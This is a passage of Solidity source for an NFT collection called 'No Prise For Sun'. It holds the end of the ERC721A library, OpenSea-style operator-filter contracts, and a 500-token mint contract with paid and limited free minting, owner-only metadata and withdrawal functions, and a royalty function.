1045     // =============================================================
1046 
1047     /**
1048      * @dev Mints `quantity` tokens and transfers them to `to`.
1049      *
1050      * Requirements:
1051      *
1052      * - `to` cannot be the zero address.
1053      * - `quantity` must be greater than 0.
1054      *
1055      * Emits a {Transfer} event for each mint.
1056      */
1057     function _mint(address to, uint256 quantity) internal virtual {
1058         uint256 startTokenId = _currentIndex;
1059         if (quantity == 0) revert MintZeroQuantity();
1060 
1061         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1062 
1063         // Overflows are incredibly unrealistic.
1064         // `balance` and `numberMinted` have a maximum limit of 2**64.
1065         // `tokenId` has a maximum limit of 2**256.
1066         unchecked {
1067             // Updates:
1068             // - `balance += quantity`.
1069             // - `numberMinted += quantity`.
1070             //
1071             // We can directly add to the `balance` and `numberMinted`.
1072             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1073 
1074             // Updates:
1075             // - `address` to the owner.
1076             // - `startTimestamp` to the timestamp of minting.
1077             // - `burned` to `false`.
1078             // - `nextInitialized` to `quantity == 1`.
1079             _packedOwnerships[startTokenId] = _packOwnershipData(
1080                 to,
1081                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1082             );
1083 
1084             uint256 toMasked;
1085             uint256 end = startTokenId + quantity;
1086 
1087             // Use assembly to loop and emit the `Transfer` event for gas savings.
1088             // The duplicated `log4` removes an extra check and reduces stack juggling.
1089             // The assembly, together with the surrounding Solidity code, have been
1090             // delicately arranged to nudge the compiler into producing optimized opcodes.
1091             assembly {
1092                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1093                 toMasked := and(to, _BITMASK_ADDRESS)
1094                 // Emit the `Transfer` event.
1095                 log4(
1096                     0, // Start of data (0, since no data).
1097                     0, // End of data (0, since no data).
1098                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1099                     0, // `address(0)`.
1100                     toMasked, // `to`.
1101                     startTokenId // `tokenId`.
1102                 )
1103 
1104                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1105                 // that overflows uint256 will make the loop run out of gas.
1106                 // The compiler will optimize the `iszero` away for performance.
1107                 for {
1108                     let tokenId := add(startTokenId, 1)
1109                 } iszero(eq(tokenId, end)) {
1110                     tokenId := add(tokenId, 1)
1111                 } {
1112                     // Emit the `Transfer` event. Similar to above.
1113                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1114                 }
1115             }
1116             if (toMasked == 0) revert MintToZeroAddress();
1117 
1118             _currentIndex = end;
1119         }
1120         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1121     }
1122 
1123     /**
1124      * @dev Mints `quantity` tokens and transfers them to `to`.
1125      *
1126      * This function is intended for efficient minting only during contract creation.
1127      *
1128      * It emits only one {ConsecutiveTransfer} as defined in
1129      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1130      * instead of a sequence of {Transfer} event(s).
1131      *
1132      * Calling this function outside of contract creation WILL make your contract
1133      * non-compliant with the ERC721 standard.
1134      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1135      * {ConsecutiveTransfer} event is only permissible during contract creation.
1136      *
1137      * Requirements:
1138      *
1139      * - `to` cannot be the zero address.
1140      * - `quantity` must be greater than 0.
1141      *
1142      * Emits a {ConsecutiveTransfer} event.
1143      */
1144     function _mintERC2309(address to, uint256 quantity) internal virtual {
1145         uint256 startTokenId = _currentIndex;
1146         if (to == address(0)) revert MintToZeroAddress();
1147         if (quantity == 0) revert MintZeroQuantity();
1148         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1149 
1150         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1151 
1152         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1153         unchecked {
1154             // Updates:
1155             // - `balance += quantity`.
1156             // - `numberMinted += quantity`.
1157             //
1158             // We can directly add to the `balance` and `numberMinted`.
1159             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1160 
1161             // Updates:
1162             // - `address` to the owner.
1163             // - `startTimestamp` to the timestamp of minting.
1164             // - `burned` to `false`.
1165             // - `nextInitialized` to `quantity == 1`.
1166             _packedOwnerships[startTokenId] = _packOwnershipData(
1167                 to,
1168                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1169             );
1170 
1171             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1172 
1173             _currentIndex = startTokenId + quantity;
1174         }
1175         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1176     }
1177 
1178     /**
1179      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1180      *
1181      * Requirements:
1182      *
1183      * - If `to` refers to a smart contract, it must implement
1184      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1185      * - `quantity` must be greater than 0.
1186      *
1187      * See {_mint}.
1188      *
1189      * Emits a {Transfer} event for each mint.
1190      */
1191     function _safeMint(
1192         address to,
1193         uint256 quantity,
1194         bytes memory _data
1195     ) internal virtual {
1196         _mint(to, quantity);
1197 
1198         unchecked {
1199             if (to.code.length != 0) {
1200                 uint256 end = _currentIndex;
1201                 uint256 index = end - quantity;
1202                 do {
1203                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1204                         revert TransferToNonERC721ReceiverImplementer();
1205                     }
1206                 } while (index < end);
1207                 // Reentrancy protection.
1208                 if (_currentIndex != end) revert();
1209             }
1210         }
1211     }
1212 
1213     /**
1214      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1215      */
1216     function _safeMint(address to, uint256 quantity) internal virtual {
1217         _safeMint(to, quantity, '');
1218     }
1219 
1220     // =============================================================
1221     //                        BURN OPERATIONS
1222     // =============================================================
1223 
1224     /**
1225      * @dev Equivalent to `_burn(tokenId, false)`.
1226      */
1227     function _burn(uint256 tokenId) internal virtual {
1228         _burn(tokenId, false);
1229     }
1230 
1231     /**
1232      * @dev Destroys `tokenId`.
1233      * The approval is cleared when the token is burned.
1234      *
1235      * Requirements:
1236      *
1237      * - `tokenId` must exist.
1238      *
1239      * Emits a {Transfer} event.
1240      */
1241     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1242         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1243 
1244         address from = address(uint160(prevOwnershipPacked));
1245 
1246         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1247 
1248         if (approvalCheck) {
1249             // The nested ifs save around 20+ gas over a compound boolean condition.
1250             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1251                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1252         }
1253 
1254         _beforeTokenTransfers(from, address(0), tokenId, 1);
1255 
1256         // Clear approvals from the previous owner.
1257         assembly {
1258             if approvedAddress {
1259                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1260                 sstore(approvedAddressSlot, 0)
1261             }
1262         }
1263 
1264         // Underflow of the sender's balance is impossible because we check for
1265         // ownership above and the recipient's balance can't realistically overflow.
1266         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1267         unchecked {
1268             // Updates:
1269             // - `balance -= 1`.
1270             // - `numberBurned += 1`.
1271             //
1272             // We can directly decrement the balance, and increment the number burned.
1273             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1274             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1275 
1276             // Updates:
1277             // - `address` to the last owner.
1278             // - `startTimestamp` to the timestamp of burning.
1279             // - `burned` to `true`.
1280             // - `nextInitialized` to `true`.
1281             _packedOwnerships[tokenId] = _packOwnershipData(
1282                 from,
1283                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1284             );
1285 
1286             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1287             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1288                 uint256 nextTokenId = tokenId + 1;
1289                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1290                 if (_packedOwnerships[nextTokenId] == 0) {
1291                     // If the next slot is within bounds.
1292                     if (nextTokenId != _currentIndex) {
1293                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1294                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1295                     }
1296                 }
1297             }
1298         }
1299 
1300         emit Transfer(from, address(0), tokenId);
1301         _afterTokenTransfers(from, address(0), tokenId, 1);
1302 
1303         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1304         unchecked {
1305             _burnCounter++;
1306         }
1307     }
1308 
1309     // =============================================================
1310     //                     EXTRA DATA OPERATIONS
1311     // =============================================================
1312 
1313     /**
1314      * @dev Directly sets the extra data for the ownership data `index`.
1315      */
1316     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1317         uint256 packed = _packedOwnerships[index];
1318         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1319         uint256 extraDataCasted;
1320         // Cast `extraData` with assembly to avoid redundant masking.
1321         assembly {
1322             extraDataCasted := extraData
1323         }
1324         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1325         _packedOwnerships[index] = packed;
1326     }
1327 
1328     /**
1329      * @dev Called during each token transfer to set the 24bit `extraData` field.
1330      * Intended to be overridden by the cosumer contract.
1331      *
1332      * `previousExtraData` - the value of `extraData` before transfer.
1333      *
1334      * Calling conditions:
1335      *
1336      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1337      * transferred to `to`.
1338      * - When `from` is zero, `tokenId` will be minted for `to`.
1339      * - When `to` is zero, `tokenId` will be burned by `from`.
1340      * - `from` and `to` are never both zero.
1341      */
1342     function _extraData(
1343         address from,
1344         address to,
1345         uint24 previousExtraData
1346     ) internal view virtual returns (uint24) {}
1347 
1348     /**
1349      * @dev Returns the next extra data for the packed ownership data.
1350      * The returned result is shifted into position.
1351      */
1352     function _nextExtraData(
1353         address from,
1354         address to,
1355         uint256 prevOwnershipPacked
1356     ) private view returns (uint256) {
1357         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1358         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1359     }
1360 
1361     // =============================================================
1362     //                       OTHER OPERATIONS
1363     // =============================================================
1364 
1365     /**
1366      * @dev Returns the message sender (defaults to `msg.sender`).
1367      *
1368      * If you are writing GSN compatible contracts, you need to override this function.
1369      */
1370     function _msgSenderERC721A() internal view virtual returns (address) {
1371         return msg.sender;
1372     }
1373 
1374     /**
1375      * @dev Converts a uint256 to its ASCII string decimal representation.
1376      */
1377     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1378         assembly {
1379             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1380             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1381             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1382             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1383             let m := add(mload(0x40), 0xa0)
1384             // Update the free memory pointer to allocate.
1385             mstore(0x40, m)
1386             // Assign the `str` to the end.
1387             str := sub(m, 0x20)
1388             // Zeroize the slot after the string.
1389             mstore(str, 0)
1390 
1391             // Cache the end of the memory to calculate the length later.
1392             let end := str
1393 
1394             // We write the string from rightmost digit to leftmost digit.
1395             // The following is essentially a do-while loop that also handles the zero case.
1396             // prettier-ignore
1397             for { let temp := value } 1 {} {
1398                 str := sub(str, 1)
1399                 // Write the character to the pointer.
1400                 // The ASCII index of the '0' character is 48.
1401                 mstore8(str, add(48, mod(temp, 10)))
1402                 // Keep dividing `temp` until zero.
1403                 temp := div(temp, 10)
1404                 // prettier-ignore
1405                 if iszero(temp) { break }
1406             }
1407 
1408             let length := sub(end, str)
1409             // Move the pointer 32 bytes leftwards to make room for the length.
1410             str := sub(str, 0x20)
1411             // Store the length.
1412             mstore(str, length)
1413         }
1414     }
1415 }
1416 
1417 
1418 interface IOperatorFilterRegistry {
1419     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1420     function register(address registrant) external;
1421     function registerAndSubscribe(address registrant, address subscription) external;
1422     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1423     function unregister(address addr) external;
1424     function updateOperator(address registrant, address operator, bool filtered) external;
1425     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1426     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1427     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1428     function subscribe(address registrant, address registrantToSubscribe) external;
1429     function unsubscribe(address registrant, bool copyExistingEntries) external;
1430     function subscriptionOf(address addr) external returns (address registrant);
1431     function subscribers(address registrant) external returns (address[] memory);
1432     function subscriberAt(address registrant, uint256 index) external returns (address);
1433     function copyEntriesOf(address registrant, address registrantToCopy) external;
1434     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1435     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1436     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1437     function filteredOperators(address addr) external returns (address[] memory);
1438     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1439     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1440     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1441     function isRegistered(address addr) external returns (bool);
1442     function codeHashOf(address addr) external returns (bytes32);
1443 }
1444 
1445 
1446 /**
1447  * @title  OperatorFilterer
1448  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1449  *         registrant's entries in the OperatorFilterRegistry.
1450  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1451  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1452  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1453  */
1454 abstract contract OperatorFilterer {
1455     error OperatorNotAllowed(address operator);
1456 
1457     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1458         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1459 
1460     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1461         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1462         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1463         // order for the modifier to filter addresses.
1464         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1465             if (subscribe) {
1466                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1467             } else {
1468                 if (subscriptionOrRegistrantToCopy != address(0)) {
1469                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1470                 } else {
1471                     OPERATOR_FILTER_REGISTRY.register(address(this));
1472                 }
1473             }
1474         }
1475     }
1476 
1477     modifier onlyAllowedOperator(address from) virtual {
1478         // Check registry code length to facilitate testing in environments without a deployed registry.
1479         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1480             // Allow spending tokens from addresses with balance
1481             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1482             // from an EOA.
1483             if (from == msg.sender) {
1484                 _;
1485                 return;
1486             }
1487             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1488                 revert OperatorNotAllowed(msg.sender);
1489             }
1490         }
1491         _;
1492     }
1493 
1494     modifier onlyAllowedOperatorApproval(address operator) virtual {
1495         // Check registry code length to facilitate testing in environments without a deployed registry.
1496         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1497             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1498                 revert OperatorNotAllowed(operator);
1499             }
1500         }
1501         _;
1502     }
1503 }
1504 
1505 /**
1506  * @title  DefaultOperatorFilterer
1507  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1508  */
1509 abstract contract TheOperatorFilterer is OperatorFilterer {
1510     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1511     address public owner;
1512 
1513     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1514 }
1515 
1516 
1517 contract NoPriseForSun is ERC721A, TheOperatorFilterer {
1518 
1519     string uri = "ipfs://QmabcbGN3TrsDjCVLh4xcK8MEKuy3v49T4pJmBGg4ccjou/";
1520 
1521     uint256 public maxSupply = 500;
1522 
1523     uint256 public mintPrice = 0.002 ether;
1524 
1525     uint256 public maxFreeMintAmountPerTx = 1;
1526 
1527     uint256 public maxMintAmountPerWallet = 20;
1528 
1529     mapping(address => uint256) private _userForFree;
1530 
1531     mapping(uint256 => uint256) private _userMinted;
1532 
1533     function publicMint(uint256 amount) payable public {
1534         require(totalSupply() + amount <= maxSupply);
1535         _mint(amount);
1536     }
1537 
1538     function _mint(uint256 amount) internal {
1539         if (msg.value == 0) {
1540             require(amount == 1);
1541             if (totalSupply() > maxSupply / 5) {
1542                 require(_userMinted[block.number] < FreeNum() 
1543                 && _userForFree[tx.origin] < maxFreeMintAmountPerTx );
1544                 _userForFree[tx.origin]++;
1545                 _userMinted[block.number]++;
1546             }
1547             _safeMint(msg.sender, 1);
1548         } else {
1549             require(msg.value >= mintPrice * amount);
1550             _safeMint(msg.sender, amount);
1551         }
1552     }
1553 
1554     function privateMint(address addr, uint256 amount) public onlyOwner {
1555         require(totalSupply() + amount <= maxSupply);
1556         _safeMint(addr, amount);
1557     }
1558     
1559     modifier onlyOwner {
1560         require(owner == msg.sender);
1561         _;
1562     }
1563 
1564     constructor() ERC721A("No Prise For Sun", "Sun") {
1565         owner = msg.sender;
1566         maxMintAmountPerWallet = 20;
1567     }
1568 
1569     function setURi(string memory u) public onlyOwner {
1570         uri = u;
1571     }
1572 
1573     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1574         return string(abi.encodePacked(uri, _toString(tokenId), ".json"));
1575     }
1576 
1577     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1578         maxFreeMintAmountPerTx = maxTx;
1579         maxSupply = maxS;
1580     }
1581 
1582     function FreeNum() internal returns (uint256){
1583         return (maxSupply - totalSupply()) / 12;
1584     }
1585 
1586     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1587         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1588         return (owner, royaltyAmount);
1589     }
1590 
1591     function withdraw() external onlyOwner {
1592         payable(msg.sender).transfer(address(this).balance);
1593     }
1594 
1595     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1596         super.setApprovalForAll(operator, approved);
1597     }
1598 
1599     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1600         super.approve(operator, tokenId);
1601     }
1602 
1603     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1604         super.transferFrom(from, to, tokenId);
1605     }
1606 
1607     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1608         super.safeTransferFrom(from, to, tokenId);
1609     }
1610 
1611     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1612         public
1613         payable
1614         override
1615         onlyAllowedOperator(from)
1616     {
1617         super.safeTransferFrom(from, to, tokenId, data);
1618     }
1619 }